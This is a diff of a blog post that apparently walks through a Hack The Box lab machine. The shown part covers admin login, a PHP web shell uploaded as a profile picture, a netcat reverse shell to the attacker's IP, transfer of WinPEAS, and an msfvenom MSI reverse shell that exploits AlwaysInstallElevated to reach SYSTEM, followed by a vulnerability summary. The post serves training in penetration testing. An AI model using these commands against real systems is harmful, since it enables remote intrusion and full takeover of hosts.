@@ -144,91 +144,98 @@ Most likely, this means I can force the server to make a request on my behalf an
 
 I attempt to log in to the voting system as the administrator at [http://love.htb/admin](http://love.htb/admin) using **admin** as the user ID and the password I just obtained as the password and was successful, evidenced via a temporary redirect response code of 302 from the server as shown in Figure 14.
 
-![Successfully logged on to victim computer](/Pen-testing-blog/assets/images/Successful login to administration interface_Love.png "Figure 14 - Successfully logged into Web application administration interface on victim computer")
+![Successfully logged on to victim computer](/Pen-testing-blog/assets/images/SuccessfulLoginAdministrationInterface_Love.png "Figure 14 - Successfully logged into Web application administration interface on victim computer")
 
-After logging in successfully as the administrative user, I am presented with the voting system dashboard and discover it is possible to upload a custom picture for administrative user profile. Immediately, I suspect there might be an arbitrary file upload vulnerability that can grant remote code execution (RCE). I test for RCE by writing a simple snippet of PHP code to create a web shell (**webshell.php**), uploading as an image file, and passing in the test command, **whoami** as the value of the cmd parameter. The test was successful, returning the login ID of currently logged in user, thus confirming I have RCE on the web server.
+After logging in successfully as the administrative user, I am presented with the voting system dashboard and discover it is possible to upload a custom picture for administrative user profile. Immediately, I suspect there might be an arbitrary file upload vulnerability that can grant remote code execution (RCE). I test for RCE by writing a simple snippet of PHP code to create a web shell (**webshell.php**), uploading as an image file, and passing in the test command, **whoami** as the value of the cmd parameter. The test was successful, returning the login ID of currently logged in user, thus confirming I have RCE on the web server as shown in Figure 15 below.
 
 ```bash
 <?php system($\_REQUEST\["cmd"\]);
 ```
 
-![](/Pen-testing-blog/assets/images/1__pNPNKfok__iy__baDT5mymHw.png)
+![Successful RCE on web server](/Pen-testing-blog/assets/images/SuccessfulRCEWebApplicationServer_Love.png "Figure 15 - Successful RCE on web server")
 
 ### Establishing reverse shell connection as Phoebe — Using netcat with -e switch
 
-The next step after confirming RCE is to obtain a reverse shell on the system to gain the initial foothold. First, I upload the **nc.exe** executable file to the web server via exploiting the arbitrary file upload vulnerability as shown above.
+The next step after confirming RCE is to obtain a reverse shell on the system to gain the initial foothold. First, I upload the web shell file , **webshell.php**, and NetCat executable file, **nc.exe**  to the web server via exploiting the arbitrary file upload vulnerability as shown in Figure 16 below.
 
-![](/Pen-testing-blog/assets/images/1__p1TMDNstoYnYYj9FLAUM7g.png)
+![Successful upload web shell and net cat executable to victim computer](/Pen-testing-blog/assets/images/SuccessfulUploadPayloadOntoVictimComputer_Love.png "Figure 16 - Successful upload of web shell payload and NetCat executable to victim computer")
 
-Next, I set up a net cat listener on my Kali Linux instance as the attacking machine to catch the reverse shell upon it being created in the next step. Explanation of flags:
+Next, I set up a net cat listener on my Kali Linux instance as the attacking machine to catch the reverse shell upon it being created in the next step as shown in Figure 17 below.  Explanation of flags:
 
-*   \-l — Set net cat to listening mode
-*   \-v — Enable verbose output for greater information
-*   \-n — Do not resolve DNS
-*   \-p port to listen on (can be any open port)
+* \-l — Set net cat to listening mode
+* \-v — Enable verbose output for greater information
+* \-n — Do not resolve DNS
+* \-p port to listen on (can be any open port)
 
-![](/Pen-testing-blog/assets/images/1__mKnbg9FIfqw0SmBbZSvFsQ.png)
+![Setting up NetCat to catch reverse shell connection](/Pen-testing-blog/assets/images/SetupNetcatListenerOnAttackingMachine_Love.png "Figure 17 - Configuring NetCat listener to catch reverse shell connection from victim computer")
 
-I remove **whoami** as the value of the **cmd** parameter passed in **webshell.php** site with the below command to have the victim’s machine initiate an outbound connection to my machine and trigger the command prompt to run after connection has been established. The reverse shell connection is successful, and I gain access to victim’s machine as user **love\\Phoebe**. Explanation of syntax:
+Next, I replace **whoami** as the value of the **cmd** parameter passed in **webshell.php** shell script with the below command to have the victim’s machine initiate an outbound connection to my machine and trigger the command prompt to run after connection has been established. The reverse shell connection is successful, and I gain access to victim’s machine as user **love\Phoebe** as shown in Figure 18 below. Explanation of syntax:
 
-*   10.10.14.36 — IP address of my Kali Linux instance
-*   4444 — Port to connect to (must match port netcat is listening on)
-*   \-e — Specify a file to run upon establishing a connection
-*   cmd.exe — Specify the command prompt as value to the -e flag
+* 10.10.14.36 — IP address of my Kali Linux instance
+* 4444 — Port to connect to (must match port netcat is listening on)
+* -e — Specify a file to run upon establishing a connection
+* cmd.exe — Specify the command prompt as value to the -e flag
 
+```bash
 cmd=nc+10.10.14.36+4444+-e+cmd.exe
+```
 
-![](/Pen-testing-blog/assets/images/1__V97ViX7oVCLnrgIfkATJtQ.png)
+![Successful establishing of reverse shell connection from victim computer](/Pen-testing-blog/assets/images/SuccessfulReverseShellUserPhoebe_Love.png "Figure 18 - Successful reverse shell connection from victim computer as user Phoebe")
 
 ## Step 4 — Privilege escalation from Phoebe to NT Authority\System
 
-The final step after gaining access as user Phoebe is to elevate my access to the root user as **NT Authority\\System**. I will be using the **WinPeas** privilege escalation scanning scripts which will enumerate the various ways my access privileges can be escalated. The scripts can either be downloaded from the [official GitHub repository](https://github.com/peass-ng/PEASS-ng) or via the native Kali Linux apt package manager using [sudo apt install peass](https://www.kali.org/tools/peass-ng/).
+The final step after gaining access as user Phoebe is to elevate my access to the root user as **NT Authority\System**. I will be using the **WinPEAS** privilege escalation scanning scripts which will enumerate the various ways my access privileges can be escalated. The scripts can either be downloaded from the [official GitHub repository](https://github.com/peass-ng/PEASS-ng) or via the native Kali Linux apt package manager using [sudo apt install peass](https://www.kali.org/tools/peass-ng/).
 
-Before I run WinPeas, I always like to run the **systeminfo** command to get some basic information on the victim’s machine such as any patches applied and the architecture of the operating system. Output of this command is show below.
+Before I run WinPeas, I always like to run the **systeminfo** command to get some basic information on the victim’s machine such as any patches applied and the architecture of the operating system. Output of this command is show in Figure 19 below.
 
-![](/Pen-testing-blog/assets/images/1__r9C7q5RyDmWpj9STDo2LKw.png)
+![SystemInfo command output](/Pen-testing-blog/assets/images/SystemInfoCommandOutput_Love.png "Figure 19 - SystemInfo command output on victim computer")
 
 ### Privilege escalation enumeration with WinPeas application
 
-I transfer the version of WinPeas executable file that matches the OS architecture on the victim’s machine from my Kali Linux instance to the victim’s machine by hosting it on a Python web server and then fetching it from victim’s machine using the curl command.
+I transfer the version of WinPeas executable file that matches the OS architecture on the victim’s machine from my Kali Linux instance to the victim’s machine by hosting it on a Python web server and then fetching it from victim’s machine using the curl command as shown in Figure 20 and Figure 21 below.
 
-![](/Pen-testing-blog/assets/images/1__IVElxJiZmm5bnLbSWwynzg.png)
-![](/Pen-testing-blog/assets/images/1__rAduNmp2dZLsEQEq7Eu1Nw.png)
+![Successfully downloaded WinPEASS tool onto victim computer](/Pen-testing-blog/assets/images/SuccessfulDownloadWinPEASVictimComputer_Love.png "Figure 20 - Successfully downloaded WinPEASS privilege escalation scanning tool onto victim computer")
 
-After running the winpeas64.exe script, I find out that the setting [**AlwaysInstallElevated** is enabled](https://learn.microsoft.com/en-us/windows/win32/msi/installing-a-package-with-elevated-privileges-for-a-non-admin) which enables any user to install Microsoft installer packages (.msi files) with elevated administrator privileges. All I have to do is create a malicious msi file and execute it on the victim’s machine.
+![WinPEASS tool on the victim computer](/Pen-testing-blog/assets/images/WinPEASSuccessfullyOnVictimComputer_Love.png "Figure 21 - WinPEASS privilege escalation scanning tool on the victim computer")
 
-![](/Pen-testing-blog/assets/images/1__VYVqjJbCKZvsN__38ERSXTA.png)
+After running the winpeas64.exe script, I find out that the setting [**AlwaysInstallElevated** is enabled](https://learn.microsoft.com/en-us/windows/win32/msi/installing-a-package-with-elevated-privileges-for-a-non-admin) as shown in Figure 22 below which enables any user to install Microsoft installer packages (.msi files) with elevated administrator privileges. All I have to do to fully escalate my access privileges to NT Authority\System is to create a malicious msi file and execute it on the victim’s machine.
 
-### Exploitation of security misconfiguration to obtain root user
+![Always install elevated setting enabled](/Pen-testing-blog/assets/images/AlwaysInstallElevatedEnabled_Love.png "Figure 22 - AlwaysInstallElevated setting enabled")
 
-I will create the malicious payload using msfvenom. The configuration of the payload must match the configuration of the victim’s machine as shown by the **systeminfo** command output. Explanation of flags:
+### Full access privilege escalation to NT Authority\System via exploitation of broken access control vulnerability
 
-*   \-a — Specify the architecture — Choose x64
-*   — Platforms — Specify the OS — Choose Windows
-*   \-p — Specify the payload — Choose x64 stageless reverse shell over TCP
-*   LHOST — Specify IP address of my Kali Linux attacking machine
-*   LPORT — Specify port to use (can be any open port)
-*   \-f — Specify payload format — choose msi
-*   \-o — Specify output file name
+I will create the malicious payload using msfvenom. The configuration of the payload must match the configuration of the victim’s machine as shown in the **systeminfo** command output. Explanation of flags:
 
+* \-a — Specify the architecture — Choose x64
+* — Platforms — Specify the OS — Choose Windows
+* \-p — Specify the payload — Choose x64 stageless reverse shell over TCP
+* LHOST — Specify IP address of my Kali Linux attacking machine
+* LPORT — Specify port to use (can be any open port)
+* \-f — Specify payload format — choose msi
+* \-o — Specify output file name
+
+```bash
 msfvenom -a x64 --platform windows -p windows/x64/shell\_reverse\_tcp LHOST=10.10.14.36 LPORT=4445 -f msi -o reverseshell.msi
+```
 
 After transferring the malicious file to the victim’s machine via the Python server I previously set up, I execute the payload using the **msiexec** tool. Explanation of flags:
 
-*   /quiet — specify install in quiet mode to not require user interaction
-*   /qn — Suppress all user interfaces during installation process
-*   /i — Install in normal user mode
+* /quiet — specify install in quiet mode to not require user interaction
+* /qn — Suppress all user interfaces during installation process
+* /i — Install in normal user mode
 
+```bash
 msiexec /quiet /qn /i reverseshell.msi
+```
 
-After the malicious msi file is successfully installed, the malicious reverse shell payload executes, granting me access as **NT Authority\\System.**
+After the malicious msi file is successfully installed, the malicious reverse shell payload executes, granting me access as **NT Authority\System.** as shown in Figure 23 below.
 
-![](/Pen-testing-blog/assets/images/1__cLaINZoE4o2zMmu3gkzbfg.png)
+![Full escalation of access privileges to NT Authority\System](/Pen-testing-blog/assets/images/SuccessfulEscalationNTAuthoritySystem_Love.png ""Figure 23 - Successful escalation of access privileges to NT Authority\System")
 
 ### Vulnerability Summary
 
 This machine contained the following vulnerabilities:
 
-*   **Server-side request forgery** — As a result of not limiting server requests to only trusted endpoints, I was able to force the server to connect to my Kali Linux instance on my behalf and by not filtering localhost or http://127.0.0.1 from permitted input in user supplied URL, I was able to force the server to send a request to itself via its loopback address and thereby access sensitive , internal only resources without authentication.
-*   **Arbitrary file upload** — As a result of no filtering in place for either file type, file content, or file extensions for files being uploaded to the images directory on the web server, I was able upload a malicious payload in form of a web shell in lieu of a legitimate image file type such as jpeg or png.
-*   **Security misconfiguration** - As a result of the AlwayInstallElevated registry value being enabled (registry keys set to 1), I was able to install msi files as a non — administrative user.
+* **Server-side request forgery** — As a result of not limiting server requests to only trusted endpoints, I was able to force the server to connect to my Kali Linux instance on my behalf and by not filtering localhost or http://127.0.0.1 from permitted input in user supplied URL, I was able to force the server to send a request to itself via its loopback address and thereby access sensitive , internal only resources without authentication.
+* **Arbitrary file upload** — As a result of no filtering in place for either file type, file content, or file extensions for files being uploaded to the images directory on the web server, I was able upload a malicious payload in form of a web shell in lieu of a legitimate image file type such as jpeg or png.
+* **Security misconfiguration** - As a result of the AlwayInstallElevated registry value being enabled (registry keys set to 1), I was able to install msi files as a non — administrative user.
